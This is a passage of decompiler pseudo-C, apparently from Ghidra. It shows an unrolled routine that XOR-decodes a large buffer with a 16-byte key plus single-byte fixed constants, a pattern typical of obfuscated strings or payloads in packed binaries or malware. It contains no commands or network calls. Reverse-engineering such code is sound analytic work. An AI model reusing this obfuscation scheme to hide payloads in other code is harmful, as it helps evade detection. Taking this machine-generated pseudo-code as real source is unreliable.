                                                       CONCAT13((byte)((ulong)uVar36 >> 0x18) ^
                                                                bVar27,CONCAT12((byte)((ulong)uVar36
                                                                                      >> 0x10) ^
                                                                                bVar26,CONCAT11((
                                                  byte)((ulong)uVar36 >> 8) ^ bVar25,
                                                  (byte)uVar36 ^ bVar24)))))));
      puVar11[4] = CONCAT17((byte)((ulong)uVar35 >> 0x38) ^ bVar23,
                            CONCAT16((byte)((ulong)uVar35 >> 0x30) ^ bVar22,
                                     CONCAT15((byte)((ulong)uVar35 >> 0x28) ^ bVar21,
                                              CONCAT14((byte)((ulong)uVar35 >> 0x20) ^ bVar20,
                                                       CONCAT13((byte)((ulong)uVar35 >> 0x18) ^
                                                                bVar19,CONCAT12((byte)((ulong)uVar35
                                                                                      >> 0x10) ^
                                                                                bVar18,CONCAT11((
                                                  byte)((ulong)uVar35 >> 8) ^ bVar17,
                                                  (byte)uVar35 ^ bVar16)))))));
      puVar11[7] = CONCAT17((byte)((ulong)uVar38 >> 0x38) ^ bVar31,
                            CONCAT16((byte)((ulong)uVar38 >> 0x30) ^ bVar30,
                                     CONCAT15((byte)((ulong)uVar38 >> 0x28) ^ bVar29,
                                              CONCAT14((byte)((ulong)uVar38 >> 0x20) ^ bVar28,
                                                       CONCAT13((byte)((ulong)uVar38 >> 0x18) ^
                                                                bVar27,CONCAT12((byte)((ulong)uVar38
                                                                                      >> 0x10) ^
                                                                                bVar26,CONCAT11((
                                                  byte)((ulong)uVar38 >> 8) ^ bVar25,
                                                  (byte)uVar38 ^ bVar24)))))));
      puVar11[6] = CONCAT17((byte)((ulong)uVar37 >> 0x38) ^ bVar23,
                            CONCAT16((byte)((ulong)uVar37 >> 0x30) ^ bVar22,
                                     CONCAT15((byte)((ulong)uVar37 >> 0x28) ^ bVar21,
                                              CONCAT14((byte)((ulong)uVar37 >> 0x20) ^ bVar20,
                                                       CONCAT13((byte)((ulong)uVar37 >> 0x18) ^
                                                                bVar19,CONCAT12((byte)((ulong)uVar37
                                                                                      >> 0x10) ^
                                                                                bVar18,CONCAT11((
                                                  byte)((ulong)uVar37 >> 8) ^ bVar17,
                                                  (byte)uVar37 ^ bVar16)))))));
      puVar11[9] = CONCAT17((byte)((ulong)uVar40 >> 0x38) ^ bVar31,
                            CONCAT16((byte)((ulong)uVar40 >> 0x30) ^ bVar30,
                                     CONCAT15((byte)((ulong)uVar40 >> 0x28) ^ bVar29,
                                              CONCAT14((byte)((ulong)uVar40 >> 0x20) ^ bVar28,
                                                       CONCAT13((byte)((ulong)uVar40 >> 0x18) ^
                                                                bVar27,CONCAT12((byte)((ulong)uVar40
                                                                                      >> 0x10) ^
                                                                                bVar26,CONCAT11((
                                                  byte)((ulong)uVar40 >> 8) ^ bVar25,
                                                  (byte)uVar40 ^ bVar24)))))));
      puVar11[8] = CONCAT17((byte)((ulong)uVar39 >> 0x38) ^ bVar23,
                            CONCAT16((byte)((ulong)uVar39 >> 0x30) ^ bVar22,
                                     CONCAT15((byte)((ulong)uVar39 >> 0x28) ^ bVar21,
                                              CONCAT14((byte)((ulong)uVar39 >> 0x20) ^ bVar20,
                                                       CONCAT13((byte)((ulong)uVar39 >> 0x18) ^
                                                                bVar19,CONCAT12((byte)((ulong)uVar39
                                                                                      >> 0x10) ^
                                                                                bVar18,CONCAT11((
                                                  byte)((ulong)uVar39 >> 8) ^ bVar17,
                                                  (byte)uVar39 ^ bVar16)))))));
      puVar11[0xb] = CONCAT17((byte)((ulong)uVar42 >> 0x38) ^ bVar31,
                              CONCAT16((byte)((ulong)uVar42 >> 0x30) ^ bVar30,
                                       CONCAT15((byte)((ulong)uVar42 >> 0x28) ^ bVar29,
                                                CONCAT14((byte)((ulong)uVar42 >> 0x20) ^ bVar28,
                                                         CONCAT13((byte)((ulong)uVar42 >> 0x18) ^
                                                                  bVar27,CONCAT12((byte)((ulong)
                                                  uVar42 >> 0x10) ^ bVar26,
                                                  CONCAT11((byte)((ulong)uVar42 >> 8) ^ bVar25,
                                                           (byte)uVar42 ^ bVar24)))))));
      puVar11[10] = CONCAT17((byte)((ulong)uVar41 >> 0x38) ^ bVar23,
                             CONCAT16((byte)((ulong)uVar41 >> 0x30) ^ bVar22,
                                      CONCAT15((byte)((ulong)uVar41 >> 0x28) ^ bVar21,
                                               CONCAT14((byte)((ulong)uVar41 >> 0x20) ^ bVar20,
                                                        CONCAT13((byte)((ulong)uVar41 >> 0x18) ^
                                                                 bVar19,CONCAT12((byte)((ulong)
                                                  uVar41 >> 0x10) ^ bVar18,
                                                  CONCAT11((byte)((ulong)uVar41 >> 8) ^ bVar17,
                                                           (byte)uVar41 ^ bVar16)))))));
      uVar33 = puVar11[0x11];
      uVar32 = puVar11[0x10];
      uVar38 = puVar11[0x13];
      uVar37 = puVar11[0x12];
      puVar11[0xd] = CONCAT17((byte)((ulong)uVar44 >> 0x38) ^ bVar31,
                              CONCAT16((byte)((ulong)uVar44 >> 0x30) ^ bVar30,
                                       CONCAT15((byte)((ulong)uVar44 >> 0x28) ^ bVar29,
                                                CONCAT14((byte)((ulong)uVar44 >> 0x20) ^ bVar28,
                                                         CONCAT13((byte)((ulong)uVar44 >> 0x18) ^
                                                                  bVar27,CONCAT12((byte)((ulong)
                                                  uVar44 >> 0x10) ^ bVar26,
                                                  CONCAT11((byte)((ulong)uVar44 >> 8) ^ bVar25,
                                                           (byte)uVar44 ^ bVar24)))))));
      puVar11[0xc] = CONCAT17((byte)((ulong)uVar43 >> 0x38) ^ bVar23,
                              CONCAT16((byte)((ulong)uVar43 >> 0x30) ^ bVar22,
                                       CONCAT15((byte)((ulong)uVar43 >> 0x28) ^ bVar21,
                                                CONCAT14((byte)((ulong)uVar43 >> 0x20) ^ bVar20,
                                                         CONCAT13((byte)((ulong)uVar43 >> 0x18) ^
                                                                  bVar19,CONCAT12((byte)((ulong)
                                                  uVar43 >> 0x10) ^ bVar18,
                                                  CONCAT11((byte)((ulong)uVar43 >> 8) ^ bVar17,
                                                           (byte)uVar43 ^ bVar16)))))));
      puVar11[0xf] = CONCAT17((byte)((ulong)uVar34 >> 0x38) ^ bVar31,
                              CONCAT16((byte)((ulong)uVar34 >> 0x30) ^ bVar30,
                                       CONCAT15((byte)((ulong)uVar34 >> 0x28) ^ bVar29,
                                                CONCAT14((byte)((ulong)uVar34 >> 0x20) ^ bVar28,
                                                         CONCAT13((byte)((ulong)uVar34 >> 0x18) ^
                                                                  bVar27,CONCAT12((byte)((ulong)
                                                  uVar34 >> 0x10) ^ bVar26,
                                                  CONCAT11((byte)((ulong)uVar34 >> 8) ^ bVar25,
                                                           (byte)uVar34 ^ bVar24)))))));
      puVar11[0xe] = CONCAT17((byte)((ulong)uVar12 >> 0x38) ^ bVar23,
                              CONCAT16((byte)((ulong)uVar12 >> 0x30) ^ bVar22,
                                       CONCAT15((byte)((ulong)uVar12 >> 0x28) ^ bVar21,
                                                CONCAT14((byte)((ulong)uVar12 >> 0x20) ^ bVar20,
                                                         CONCAT13((byte)((ulong)uVar12 >> 0x18) ^
                                                                  bVar19,CONCAT12((byte)((ulong)
                                                  uVar12 >> 0x10) ^ bVar18,
                                                  CONCAT11((byte)((ulong)uVar12 >> 8) ^ bVar17,
                                                           (byte)uVar12 ^ bVar16)))))));
      uVar34 = puVar11[0x15];
      uVar12 = puVar11[0x14];
      uVar36 = puVar11[0x17];
      uVar35 = puVar11[0x16];
      puVar11[0x11] =
           CONCAT17((byte)((ulong)uVar33 >> 0x38) ^ bVar31,
                    CONCAT16((byte)((ulong)uVar33 >> 0x30) ^ bVar30,
                             CONCAT15((byte)((ulong)uVar33 >> 0x28) ^ bVar29,
                                      CONCAT14((byte)((ulong)uVar33 >> 0x20) ^ bVar28,
                                               CONCAT13((byte)((ulong)uVar33 >> 0x18) ^ bVar27,
                                                        CONCAT12((byte)((ulong)uVar33 >> 0x10) ^
                                                                 bVar26,CONCAT11((byte)((ulong)
                                                  uVar33 >> 8) ^ bVar25,(byte)uVar33 ^ bVar24)))))))
      ;
      puVar11[0x10] =
           CONCAT17((byte)((ulong)uVar32 >> 0x38) ^ bVar23,
                    CONCAT16((byte)((ulong)uVar32 >> 0x30) ^ bVar22,
                             CONCAT15((byte)((ulong)uVar32 >> 0x28) ^ bVar21,
                                      CONCAT14((byte)((ulong)uVar32 >> 0x20) ^ bVar20,
                                               CONCAT13((byte)((ulong)uVar32 >> 0x18) ^ bVar19,
                                                        CONCAT12((byte)((ulong)uVar32 >> 0x10) ^
                                                                 bVar18,CONCAT11((byte)((ulong)
                                                  uVar32 >> 8) ^ bVar17,(byte)uVar32 ^ bVar16)))))))
      ;
      puVar11[0x13] =
           CONCAT17((byte)((ulong)uVar38 >> 0x38) ^ bVar31,
                    CONCAT16((byte)((ulong)uVar38 >> 0x30) ^ bVar30,
                             CONCAT15((byte)((ulong)uVar38 >> 0x28) ^ bVar29,
                                      CONCAT14((byte)((ulong)uVar38 >> 0x20) ^ bVar28,
                                               CONCAT13((byte)((ulong)uVar38 >> 0x18) ^ bVar27,
                                                        CONCAT12((byte)((ulong)uVar38 >> 0x10) ^
                                                                 bVar26,CONCAT11((byte)((ulong)
                                                  uVar38 >> 8) ^ bVar25,(byte)uVar38 ^ bVar24)))))))
      ;
      puVar11[0x12] =
           CONCAT17((byte)((ulong)uVar37 >> 0x38) ^ bVar23,
                    CONCAT16((byte)((ulong)uVar37 >> 0x30) ^ bVar22,
                             CONCAT15((byte)((ulong)uVar37 >> 0x28) ^ bVar21,
                                      CONCAT14((byte)((ulong)uVar37 >> 0x20) ^ bVar20,
                                               CONCAT13((byte)((ulong)uVar37 >> 0x18) ^ bVar19,
                                                        CONCAT12((byte)((ulong)uVar37 >> 0x10) ^
                                                                 bVar18,CONCAT11((byte)((ulong)
                                                  uVar37 >> 8) ^ bVar17,(byte)uVar37 ^ bVar16)))))))
      ;
      uVar33 = puVar11[0x19];
      uVar32 = puVar11[0x18];
      uVar38 = puVar11[0x1b];
      uVar37 = puVar11[0x1a];
      puVar11[0x15] =
           CONCAT17((byte)((ulong)uVar34 >> 0x38) ^ bVar31,
                    CONCAT16((byte)((ulong)uVar34 >> 0x30) ^ bVar30,
                             CONCAT15((byte)((ulong)uVar34 >> 0x28) ^ bVar29,
                                      CONCAT14((byte)((ulong)uVar34 >> 0x20) ^ bVar28,
                                               CONCAT13((byte)((ulong)uVar34 >> 0x18) ^ bVar27,
                                                        CONCAT12((byte)((ulong)uVar34 >> 0x10) ^
                                                                 bVar26,CONCAT11((byte)((ulong)
                                                  uVar34 >> 8) ^ bVar25,(byte)uVar34 ^ bVar24)))))))
      ;
      puVar11[0x14] =
           CONCAT17((byte)((ulong)uVar12 >> 0x38) ^ bVar23,
                    CONCAT16((byte)((ulong)uVar12 >> 0x30) ^ bVar22,
                             CONCAT15((byte)((ulong)uVar12 >> 0x28) ^ bVar21,
                                      CONCAT14((byte)((ulong)uVar12 >> 0x20) ^ bVar20,
                                               CONCAT13((byte)((ulong)uVar12 >> 0x18) ^ bVar19,
                                                        CONCAT12((byte)((ulong)uVar12 >> 0x10) ^
                                                                 bVar18,CONCAT11((byte)((ulong)
                                                  uVar12 >> 8) ^ bVar17,(byte)uVar12 ^ bVar16)))))))
      ;
      puVar11[0x17] =
           CONCAT17((byte)((ulong)uVar36 >> 0x38) ^ bVar31,
                    CONCAT16((byte)((ulong)uVar36 >> 0x30) ^ bVar30,
                             CONCAT15((byte)((ulong)uVar36 >> 0x28) ^ bVar29,
                                      CONCAT14((byte)((ulong)uVar36 >> 0x20) ^ bVar28,
                                               CONCAT13((byte)((ulong)uVar36 >> 0x18) ^ bVar27,
                                                        CONCAT12((byte)((ulong)uVar36 >> 0x10) ^
                                                                 bVar26,CONCAT11((byte)((ulong)
                                                  uVar36 >> 8) ^ bVar25,(byte)uVar36 ^ bVar24)))))))
      ;
      puVar11[0x16] =
           CONCAT17((byte)((ulong)uVar35 >> 0x38) ^ bVar23,
                    CONCAT16((byte)((ulong)uVar35 >> 0x30) ^ bVar22,
                             CONCAT15((byte)((ulong)uVar35 >> 0x28) ^ bVar21,
                                      CONCAT14((byte)((ulong)uVar35 >> 0x20) ^ bVar20,
                                               CONCAT13((byte)((ulong)uVar35 >> 0x18) ^ bVar19,
                                                        CONCAT12((byte)((ulong)uVar35 >> 0x10) ^
                                                                 bVar18,CONCAT11((byte)((ulong)
                                                  uVar35 >> 8) ^ bVar17,(byte)uVar35 ^ bVar16)))))))
      ;
      *(byte *)(puVar11 + 0x34) = *(byte *)(puVar11 + 0x34) ^ 0xd;
      uVar34 = puVar11[0x1d];
      uVar12 = puVar11[0x1c];
      uVar36 = puVar11[0x1f];
      uVar35 = puVar11[0x1e];
      puVar11[0x19] =
           CONCAT17((byte)((ulong)uVar33 >> 0x38) ^ bVar31,
                    CONCAT16((byte)((ulong)uVar33 >> 0x30) ^ bVar30,
                             CONCAT15((byte)((ulong)uVar33 >> 0x28) ^ bVar29,
                                      CONCAT14((byte)((ulong)uVar33 >> 0x20) ^ bVar28,
                                               CONCAT13((byte)((ulong)uVar33 >> 0x18) ^ bVar27,
                                                        CONCAT12((byte)((ulong)uVar33 >> 0x10) ^
                                                                 bVar26,CONCAT11((byte)((ulong)
                                                  uVar33 >> 8) ^ bVar25,(byte)uVar33 ^ bVar24)))))))
      ;
      puVar11[0x18] =
           CONCAT17((byte)((ulong)uVar32 >> 0x38) ^ bVar23,
                    CONCAT16((byte)((ulong)uVar32 >> 0x30) ^ bVar22,
                             CONCAT15((byte)((ulong)uVar32 >> 0x28) ^ bVar21,
                                      CONCAT14((byte)((ulong)uVar32 >> 0x20) ^ bVar20,
                                               CONCAT13((byte)((ulong)uVar32 >> 0x18) ^ bVar19,
                                                        CONCAT12((byte)((ulong)uVar32 >> 0x10) ^
                                                                 bVar18,CONCAT11((byte)((ulong)
                                                  uVar32 >> 8) ^ bVar17,(byte)uVar32 ^ bVar16)))))))
      ;
      puVar11[0x1b] =
           CONCAT17((byte)((ulong)uVar38 >> 0x38) ^ bVar31,
                    CONCAT16((byte)((ulong)uVar38 >> 0x30) ^ bVar30,
                             CONCAT15((byte)((ulong)uVar38 >> 0x28) ^ bVar29,
                                      CONCAT14((byte)((ulong)uVar38 >> 0x20) ^ bVar28,
                                               CONCAT13((byte)((ulong)uVar38 >> 0x18) ^ bVar27,
                                                        CONCAT12((byte)((ulong)uVar38 >> 0x10) ^
                                                                 bVar26,CONCAT11((byte)((ulong)
                                                  uVar38 >> 8) ^ bVar25,(byte)uVar38 ^ bVar24)))))))
      ;
      puVar11[0x1a] =
           CONCAT17((byte)((ulong)uVar37 >> 0x38) ^ bVar23,
                    CONCAT16((byte)((ulong)uVar37 >> 0x30) ^ bVar22,
                             CONCAT15((byte)((ulong)uVar37 >> 0x28) ^ bVar21,
                                      CONCAT14((byte)((ulong)uVar37 >> 0x20) ^ bVar20,
                                               CONCAT13((byte)((ulong)uVar37 >> 0x18) ^ bVar19,
                                                        CONCAT12((byte)((ulong)uVar37 >> 0x10) ^
                                                                 bVar18,CONCAT11((byte)((ulong)
                                                  uVar37 >> 8) ^ bVar17,(byte)uVar37 ^ bVar16)))))))
      ;
      uVar33 = puVar11[0x21];
      uVar32 = puVar11[0x20];
      uVar38 = puVar11[0x23];
      uVar37 = puVar11[0x22];
      puVar11[0x1d] =
           CONCAT17((byte)((ulong)uVar34 >> 0x38) ^ bVar31,
                    CONCAT16((byte)((ulong)uVar34 >> 0x30) ^ bVar30,
                             CONCAT15((byte)((ulong)uVar34 >> 0x28) ^ bVar29,
                                      CONCAT14((byte)((ulong)uVar34 >> 0x20) ^ bVar28,
                                               CONCAT13((byte)((ulong)uVar34 >> 0x18) ^ bVar27,
                                                        CONCAT12((byte)((ulong)uVar34 >> 0x10) ^
                                                                 bVar26,CONCAT11((byte)((ulong)
                                                  uVar34 >> 8) ^ bVar25,(byte)uVar34 ^ bVar24)))))))
      ;
      puVar11[0x1c] =
           CONCAT17((byte)((ulong)uVar12 >> 0x38) ^ bVar23,
                    CONCAT16((byte)((ulong)uVar12 >> 0x30) ^ bVar22,
                             CONCAT15((byte)((ulong)uVar12 >> 0x28) ^ bVar21,
                                      CONCAT14((byte)((ulong)uVar12 >> 0x20) ^ bVar20,
                                               CONCAT13((byte)((ulong)uVar12 >> 0x18) ^ bVar19,
                                                        CONCAT12((byte)((ulong)uVar12 >> 0x10) ^
                                                                 bVar18,CONCAT11((byte)((ulong)
                                                  uVar12 >> 8) ^ bVar17,(byte)uVar12 ^ bVar16)))))))
      ;
      puVar11[0x1f] =
           CONCAT17((byte)((ulong)uVar36 >> 0x38) ^ bVar31,
                    CONCAT16((byte)((ulong)uVar36 >> 0x30) ^ bVar30,
                             CONCAT15((byte)((ulong)uVar36 >> 0x28) ^ bVar29,
                                      CONCAT14((byte)((ulong)uVar36 >> 0x20) ^ bVar28,
                                               CONCAT13((byte)((ulong)uVar36 >> 0x18) ^ bVar27,
                                                        CONCAT12((byte)((ulong)uVar36 >> 0x10) ^
                                                                 bVar26,CONCAT11((byte)((ulong)
                                                  uVar36 >> 8) ^ bVar25,(byte)uVar36 ^ bVar24)))))))
      ;
      puVar11[0x1e] =
           CONCAT17((byte)((ulong)uVar35 >> 0x38) ^ bVar23,
                    CONCAT16((byte)((ulong)uVar35 >> 0x30) ^ bVar22,
                             CONCAT15((byte)((ulong)uVar35 >> 0x28) ^ bVar21,
                                      CONCAT14((byte)((ulong)uVar35 >> 0x20) ^ bVar20,
                                               CONCAT13((byte)((ulong)uVar35 >> 0x18) ^ bVar19,
                                                        CONCAT12((byte)((ulong)uVar35 >> 0x10) ^
                                                                 bVar18,CONCAT11((byte)((ulong)
                                                  uVar35 >> 8) ^ bVar17,(byte)uVar35 ^ bVar16)))))))
      ;
      *(byte *)((long)puVar11 + 0x1a1) = *(byte *)((long)puVar11 + 0x1a1) ^ 0xd9;
      uVar34 = puVar11[0x25];
      uVar12 = puVar11[0x24];
      uVar36 = puVar11[0x27];
      uVar35 = puVar11[0x26];
      puVar11[0x21] =
           CONCAT17((byte)((ulong)uVar33 >> 0x38) ^ bVar31,
                    CONCAT16((byte)((ulong)uVar33 >> 0x30) ^ bVar30,
                             CONCAT15((byte)((ulong)uVar33 >> 0x28) ^ bVar29,
                                      CONCAT14((byte)((ulong)uVar33 >> 0x20) ^ bVar28,
                                               CONCAT13((byte)((ulong)uVar33 >> 0x18) ^ bVar27,
                                                        CONCAT12((byte)((ulong)uVar33 >> 0x10) ^
                                                                 bVar26,CONCAT11((byte)((ulong)
                                                  uVar33 >> 8) ^ bVar25,(byte)uVar33 ^ bVar24)))))))
      ;
      puVar11[0x20] =
           CONCAT17((byte)((ulong)uVar32 >> 0x38) ^ bVar23,
                    CONCAT16((byte)((ulong)uVar32 >> 0x30) ^ bVar22,
                             CONCAT15((byte)((ulong)uVar32 >> 0x28) ^ bVar21,
                                      CONCAT14((byte)((ulong)uVar32 >> 0x20) ^ bVar20,
                                               CONCAT13((byte)((ulong)uVar32 >> 0x18) ^ bVar19,
                                                        CONCAT12((byte)((ulong)uVar32 >> 0x10) ^
                                                                 bVar18,CONCAT11((byte)((ulong)
                                                  uVar32 >> 8) ^ bVar17,(byte)uVar32 ^ bVar16)))))))
      ;
      puVar11[0x23] =
           CONCAT17((byte)((ulong)uVar38 >> 0x38) ^ bVar31,
                    CONCAT16((byte)((ulong)uVar38 >> 0x30) ^ bVar30,
                             CONCAT15((byte)((ulong)uVar38 >> 0x28) ^ bVar29,
                                      CONCAT14((byte)((ulong)uVar38 >> 0x20) ^ bVar28,
                                               CONCAT13((byte)((ulong)uVar38 >> 0x18) ^ bVar27,
                                                        CONCAT12((byte)((ulong)uVar38 >> 0x10) ^
                                                                 bVar26,CONCAT11((byte)((ulong)
                                                  uVar38 >> 8) ^ bVar25,(byte)uVar38 ^ bVar24)))))))
      ;
      puVar11[0x22] =
           CONCAT17((byte)((ulong)uVar37 >> 0x38) ^ bVar23,
                    CONCAT16((byte)((ulong)uVar37 >> 0x30) ^ bVar22,
                             CONCAT15((byte)((ulong)uVar37 >> 0x28) ^ bVar21,
                                      CONCAT14((byte)((ulong)uVar37 >> 0x20) ^ bVar20,
                                               CONCAT13((byte)((ulong)uVar37 >> 0x18) ^ bVar19,
                                                        CONCAT12((byte)((ulong)uVar37 >> 0x10) ^
                                                                 bVar18,CONCAT11((byte)((ulong)
                                                  uVar37 >> 8) ^ bVar17,(byte)uVar37 ^ bVar16)))))))
      ;
      uVar38 = puVar11[0x29];
      uVar37 = puVar11[0x28];
      uVar40 = puVar11[0x2b];
      uVar39 = puVar11[0x2a];
      puVar11[0x25] =
           CONCAT17((byte)((ulong)uVar34 >> 0x38) ^ bVar31,
                    CONCAT16((byte)((ulong)uVar34 >> 0x30) ^ bVar30,
                             CONCAT15((byte)((ulong)uVar34 >> 0x28) ^ bVar29,
                                      CONCAT14((byte)((ulong)uVar34 >> 0x20) ^ bVar28,
                                               CONCAT13((byte)((ulong)uVar34 >> 0x18) ^ bVar27,
                                                        CONCAT12((byte)((ulong)uVar34 >> 0x10) ^
                                                                 bVar26,CONCAT11((byte)((ulong)
                                                  uVar34 >> 8) ^ bVar25,(byte)uVar34 ^ bVar24)))))))
      ;
      puVar11[0x24] =
           CONCAT17((byte)((ulong)uVar12 >> 0x38) ^ bVar23,
                    CONCAT16((byte)((ulong)uVar12 >> 0x30) ^ bVar22,
                             CONCAT15((byte)((ulong)uVar12 >> 0x28) ^ bVar21,
                                      CONCAT14((byte)((ulong)uVar12 >> 0x20) ^ bVar20,
                                               CONCAT13((byte)((ulong)uVar12 >> 0x18) ^ bVar19,
                                                        CONCAT12((byte)((ulong)uVar12 >> 0x10) ^
                                                                 bVar18,CONCAT11((byte)((ulong)
                                                  uVar12 >> 8) ^ bVar17,(byte)uVar12 ^ bVar16)))))))
      ;
      puVar11[0x27] =
           CONCAT17((byte)((ulong)uVar36 >> 0x38) ^ bVar31,
                    CONCAT16((byte)((ulong)uVar36 >> 0x30) ^ bVar30,
                             CONCAT15((byte)((ulong)uVar36 >> 0x28) ^ bVar29,
                                      CONCAT14((byte)((ulong)uVar36 >> 0x20) ^ bVar28,
                                               CONCAT13((byte)((ulong)uVar36 >> 0x18) ^ bVar27,
                                                        CONCAT12((byte)((ulong)uVar36 >> 0x10) ^
                                                                 bVar26,CONCAT11((byte)((ulong)
                                                  uVar36 >> 8) ^ bVar25,(byte)uVar36 ^ bVar24)))))))
      ;
      puVar11[0x26] =
           CONCAT17((byte)((ulong)uVar35 >> 0x38) ^ bVar23,
                    CONCAT16((byte)((ulong)uVar35 >> 0x30) ^ bVar22,
                             CONCAT15((byte)((ulong)uVar35 >> 0x28) ^ bVar21,
                                      CONCAT14((byte)((ulong)uVar35 >> 0x20) ^ bVar20,
                                               CONCAT13((byte)((ulong)uVar35 >> 0x18) ^ bVar19,
                                                        CONCAT12((byte)((ulong)uVar35 >> 0x10) ^
                                                                 bVar18,CONCAT11((byte)((ulong)
                                                  uVar35 >> 8) ^ bVar17,(byte)uVar35 ^ bVar16)))))))
      ;
      *(byte *)((long)puVar11 + 0x1a2) = *(byte *)((long)puVar11 + 0x1a2) ^ 0x85;
      uVar34 = puVar11[0x2d];
      uVar12 = puVar11[0x2c];
      uVar33 = puVar11[0x2f];
      uVar32 = puVar11[0x2e];
      *(byte *)((long)puVar11 + 0x1a4) = *(byte *)((long)puVar11 + 0x1a4) ^ 0x6d;
      puVar11[0x29] =
           CONCAT17((byte)((ulong)uVar38 >> 0x38) ^ bVar31,
                    CONCAT16((byte)((ulong)uVar38 >> 0x30) ^ bVar30,
                             CONCAT15((byte)((ulong)uVar38 >> 0x28) ^ bVar29,
                                      CONCAT14((byte)((ulong)uVar38 >> 0x20) ^ bVar28,
                                               CONCAT13((byte)((ulong)uVar38 >> 0x18) ^ bVar27,
                                                        CONCAT12((byte)((ulong)uVar38 >> 0x10) ^
                                                                 bVar26,CONCAT11((byte)((ulong)
                                                  uVar38 >> 8) ^ bVar25,(byte)uVar38 ^ bVar24)))))))
      ;
      puVar11[0x28] =
           CONCAT17((byte)((ulong)uVar37 >> 0x38) ^ bVar23,
                    CONCAT16((byte)((ulong)uVar37 >> 0x30) ^ bVar22,
                             CONCAT15((byte)((ulong)uVar37 >> 0x28) ^ bVar21,
                                      CONCAT14((byte)((ulong)uVar37 >> 0x20) ^ bVar20,
                                               CONCAT13((byte)((ulong)uVar37 >> 0x18) ^ bVar19,
                                                        CONCAT12((byte)((ulong)uVar37 >> 0x10) ^
                                                                 bVar18,CONCAT11((byte)((ulong)
                                                  uVar37 >> 8) ^ bVar17,(byte)uVar37 ^ bVar16)))))))
      ;
      puVar11[0x2b] =
           CONCAT17((byte)((ulong)uVar40 >> 0x38) ^ bVar31,
                    CONCAT16((byte)((ulong)uVar40 >> 0x30) ^ bVar30,
                             CONCAT15((byte)((ulong)uVar40 >> 0x28) ^ bVar29,
                                      CONCAT14((byte)((ulong)uVar40 >> 0x20) ^ bVar28,
                                               CONCAT13((byte)((ulong)uVar40 >> 0x18) ^ bVar27,
                                                        CONCAT12((byte)((ulong)uVar40 >> 0x10) ^
                                                                 bVar26,CONCAT11((byte)((ulong)
                                                  uVar40 >> 8) ^ bVar25,(byte)uVar40 ^ bVar24)))))))
      ;
      puVar11[0x2a] =
           CONCAT17((byte)((ulong)uVar39 >> 0x38) ^ bVar23,
                    CONCAT16((byte)((ulong)uVar39 >> 0x30) ^ bVar22,
                             CONCAT15((byte)((ulong)uVar39 >> 0x28) ^ bVar21,
                                      CONCAT14((byte)((ulong)uVar39 >> 0x20) ^ bVar20,
                                               CONCAT13((byte)((ulong)uVar39 >> 0x18) ^ bVar19,
                                                        CONCAT12((byte)((ulong)uVar39 >> 0x10) ^
                                                                 bVar18,CONCAT11((byte)((ulong)
                                                  uVar39 >> 8) ^ bVar17,(byte)uVar39 ^ bVar16)))))))
      ;
      *(byte *)((long)puVar11 + 0x1a3) = *(byte *)((long)puVar11 + 0x1a3) ^ 0x2d;
      puVar11[0x2d] =
           CONCAT17((byte)((ulong)uVar34 >> 0x38) ^ bVar31,
                    CONCAT16((byte)((ulong)uVar34 >> 0x30) ^ bVar30,
                             CONCAT15((byte)((ulong)uVar34 >> 0x28) ^ bVar29,
                                      CONCAT14((byte)((ulong)uVar34 >> 0x20) ^ bVar28,
                                               CONCAT13((byte)((ulong)uVar34 >> 0x18) ^ bVar27,
                                                        CONCAT12((byte)((ulong)uVar34 >> 0x10) ^
                                                                 bVar26,CONCAT11((byte)((ulong)
                                                  uVar34 >> 8) ^ bVar25,(byte)uVar34 ^ bVar24)))))))
      ;
      puVar11[0x2c] =
           CONCAT17((byte)((ulong)uVar12 >> 0x38) ^ bVar23,
                    CONCAT16((byte)((ulong)uVar12 >> 0x30) ^ bVar22,
                             CONCAT15((byte)((ulong)uVar12 >> 0x28) ^ bVar21,
                                      CONCAT14((byte)((ulong)uVar12 >> 0x20) ^ bVar20,
                                               CONCAT13((byte)((ulong)uVar12 >> 0x18) ^ bVar19,
                                                        CONCAT12((byte)((ulong)uVar12 >> 0x10) ^
                                                                 bVar18,CONCAT11((byte)((ulong)
                                                  uVar12 >> 8) ^ bVar17,(byte)uVar12 ^ bVar16)))))))
      ;
      puVar11[0x2f] =
           CONCAT17((byte)((ulong)uVar33 >> 0x38) ^ bVar31,
                    CONCAT16((byte)((ulong)uVar33 >> 0x30) ^ bVar30,
                             CONCAT15((byte)((ulong)uVar33 >> 0x28) ^ bVar29,
                                      CONCAT14((byte)((ulong)uVar33 >> 0x20) ^ bVar28,
                                               CONCAT13((byte)((ulong)uVar33 >> 0x18) ^ bVar27,
                                                        CONCAT12((byte)((ulong)uVar33 >> 0x10) ^
                                                                 bVar26,CONCAT11((byte)((ulong)
                                                  uVar33 >> 8) ^ bVar25,(byte)uVar33 ^ bVar24)))))))
      ;
      puVar11[0x2e] =
           CONCAT17((byte)((ulong)uVar32 >> 0x38) ^ bVar23,
                    CONCAT16((byte)((ulong)uVar32 >> 0x30) ^ bVar22,
                             CONCAT15((byte)((ulong)uVar32 >> 0x28) ^ bVar21,
                                      CONCAT14((byte)((ulong)uVar32 >> 0x20) ^ bVar20,
                                               CONCAT13((byte)((ulong)uVar32 >> 0x18) ^ bVar19,
                                                        CONCAT12((byte)((ulong)uVar32 >> 0x10) ^
                                                                 bVar18,CONCAT11((byte)((ulong)
                                                  uVar32 >> 8) ^ bVar17,(byte)uVar32 ^ bVar16)))))))
      ;
      uVar33 = puVar11[0x31];
      uVar32 = puVar11[0x30];
      uVar34 = puVar11[0x33];
      uVar12 = puVar11[0x32];
      *(byte *)((long)puVar11 + 0x1a5) = *(byte *)((long)puVar11 + 0x1a5) ^ 5;
      *(byte *)((long)puVar11 + 0x1a6) = *(byte *)((long)puVar11 + 0x1a6) ^ 0xf3;
      *(byte *)((long)puVar11 + 0x1a7) = *(byte *)((long)puVar11 + 0x1a7) ^ 0xa3;
      *(byte *)(puVar11 + 0x35) = *(byte *)(puVar11 + 0x35) ^ 0xd;
      *(byte *)((long)puVar11 + 0x1a9) = *(byte *)((long)puVar11 + 0x1a9) ^ 0xd9;
      puVar11[0x31] =
           CONCAT17((byte)((ulong)uVar33 >> 0x38) ^ bVar31,
                    CONCAT16((byte)((ulong)uVar33 >> 0x30) ^ bVar30,
                             CONCAT15((byte)((ulong)uVar33 >> 0x28) ^ bVar29,
                                      CONCAT14((byte)((ulong)uVar33 >> 0x20) ^ bVar28,
                                               CONCAT13((byte)((ulong)uVar33 >> 0x18) ^ bVar27,
                                                        CONCAT12((byte)((ulong)uVar33 >> 0x10) ^
                                                                 bVar26,CONCAT11((byte)((ulong)
                                                  uVar33 >> 8) ^ bVar25,(byte)uVar33 ^ bVar24)))))))
      ;
